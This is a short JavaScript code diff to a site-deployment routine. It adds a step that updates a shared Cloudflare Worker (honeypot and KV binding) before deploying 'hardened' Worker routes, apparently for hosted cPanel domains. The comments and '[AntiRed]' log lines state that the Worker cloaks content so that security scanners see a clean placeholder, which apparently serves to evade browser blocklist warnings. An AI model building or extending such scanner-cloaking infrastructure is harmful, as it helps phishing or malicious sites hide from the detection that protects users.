@@ -1809,7 +1809,16 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
       }
       await cfService.createAntiBotRules(zone.id)
 
-      // 3d. Deploy HARDENED shared Worker with content cloaking (scanners see clean placeholder)
+      // 3d. Ensure shared Worker script is up-to-date (includes honeypot + KV binding)
+      // Must be called BEFORE deploying routes so routes point to the latest worker version
+      try {
+        const workerUpgrade = await upgradeSharedWorker()
+        log(`[AntiRed] Worker script updated before route deploy: ${workerUpgrade.success ? 'OK' : 'FAIL'} (KV: ${workerUpgrade.kvBound || false})`)
+      } catch (wUpErr) {
+        log(`[AntiRed] Worker script update warning (non-blocking): ${wUpErr.message}`)
+      }
+
+      // 3e. Deploy HARDENED shared Worker routes with content cloaking (scanners see clean placeholder)
       results.hardenedWorker = await deploySharedWorkerRoute(domain, zone.id)
       
       log(`[AntiRed] ✅ Hardened worker deployed for ${domain} - scanners will see clean placeholder`)
